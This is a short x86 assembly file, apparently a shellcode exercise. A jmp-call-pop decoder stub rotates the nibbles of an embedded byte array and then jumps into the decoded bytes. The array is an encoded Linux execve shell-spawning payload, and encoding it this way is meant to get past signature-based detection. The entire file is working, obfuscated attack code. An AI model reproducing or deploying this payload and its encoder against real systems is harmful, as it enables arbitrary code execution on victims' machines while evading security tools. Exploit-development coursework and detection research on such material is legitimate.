global _start

section .text
_start:
    jmp call_shellcode      ; Go to call_shellcode

decoder: 
    pop esi                 ; Get address of shellcode
    xor eax,eax             ; Clear EAX

decode:                     ; Main decode loop
    mov dword ebx,[esi+eax] ; Get current dword in shellcode
    push 0x4                ; Loop 4 times
    pop ecx

rotate_once:
    ror bl,4                ; Rotate lowest byte 4 times (0xab -> 0xba)
    rol ebx,8               ; Move to next byte in current dword
    loop rotate_once        ; Loop until all 4 bytes have been rotated

    mov dword [esi+eax],ebx ; Put byte back in esi
    cmp bl,ch               ; End of shellcode?
    jz shellcode            ; If so, execute shellcode

    add al,0x4              ; Otherwise, increment shellcode position
    jmp short decode        ; Go back to top of decode loop

call_shellcode:
    call decoder            ; Call decoder function
    shellcode: db 0x13,0x0c,0x05,0x86,0xf2,0xf2,0x37,0x86,0x86,0xf2,0x26,0x96,0xe6,0x98,0x3e,0x05,0x98,0x2e,0x35,0x98,0x1e,0x0b,0xb0,0xdc,0x08,0x00
